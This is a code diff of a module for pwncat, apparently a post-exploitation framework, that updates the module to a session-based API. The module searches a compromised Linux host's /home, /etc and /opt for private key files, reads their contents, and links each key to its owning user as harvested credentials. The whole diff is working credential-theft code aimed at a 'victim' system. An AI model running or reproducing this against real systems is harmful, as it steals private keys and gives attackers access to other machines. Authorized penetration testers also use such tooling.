@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 from Crypto.PublicKey import RSA
+import time
 
 import pwncat
 from pwncat.platform.linux import Linux
@@ -19,17 +20,22 @@ class Module(EnumerateModule):
     PLATFORM = [Linux]
     SCHEDULE = Schedule.PER_USER
 
-    def enumerate(self):
+    def enumerate(self, session: "pwncat.manager.Session"):
 
         facts = []
 
         # Search for private keys in common locations
-        with pwncat.victim.subprocess(
-            "grep -l -I -D skip -rE '^-+BEGIN .* PRIVATE KEY-+$' /home /etc /opt 2>/dev/null | xargs stat -c '%u %n' 2>/dev/null"
-        ) as pipe:
+        proc = session.platform.Popen(
+            "grep -l -I -D skip -rE '^-+BEGIN .* PRIVATE KEY-+$' /home /etc /opt 2>/dev/null | xargs stat -c '%u %n' 2>/dev/null",
+            shell=True,
+            text=True,
+            stdout=pwncat.subprocess.PIPE,
+        )
+
+        with proc.stdout as pipe:
             yield Status("searching for private keys")
             for line in pipe:
-                line = line.strip().decode("utf-8").split(" ")
+                line = line.strip().split(" ")
                 uid, path = int(line[0]), " ".join(line[1:])
                 yield Status(f"found [cyan]{path}[/cyan]")
                 facts.append(PrivateKeyData(uid, path, None, False))
@@ -37,7 +43,7 @@ class Module(EnumerateModule):
         for fact in facts:
             try:
                 yield Status(f"reading [cyan]{fact.path}[/cyan]")
-                with pwncat.victim.open(fact.path, "r") as filp:
+                with session.platform.open(fact.path, "r") as filp:
                     fact.content = filp.read().strip().replace("\r\n", "\n")
 
                 try:
@@ -53,6 +59,10 @@ class Module(EnumerateModule):
                     else:
                         # Some other error happened, probably not a key
                         continue
+
+                # we set the user field to the id temporarily
+                fact.user = session.platform.find_user(id=fact.user)
+
                 yield "creds.private_key", fact
             except (PermissionError, FileNotFoundError):
                 continue
